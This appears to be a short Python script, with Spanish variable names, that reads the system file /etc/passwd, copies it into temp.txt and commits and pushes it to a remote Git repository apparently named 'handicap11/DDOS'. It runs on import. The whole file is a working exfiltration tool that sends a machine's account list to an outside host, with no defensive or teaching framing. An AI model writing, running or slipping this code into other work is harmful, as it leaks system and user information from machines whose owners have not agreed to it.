import subprocess

def run():
    
    archivo = '/etc/passwd'
    mensaje_commit = 'archivo passwd en GitHub'

    
    with open(archivo, 'r') as file:
        contenido = file.read()
    repo_nombre = 'handicap11/DDOS'
    archivo_en_repo = 'passwd.txt'

   
    with open('temp.txt', 'w') as temp_file:
        temp_file.write(contenido)

    subprocess.run(['git', 'add', 'temp.txt'])
    subprocess.run(['git', 'commit', '-m', mensaje_commit])
    subprocess.run(['git', 'push', 'origin', 'main'])

    print(f'Archivo {archivo} publicado en GitHub en este repositorio {repo_nombre}/{archivo_en_repo}')

run()
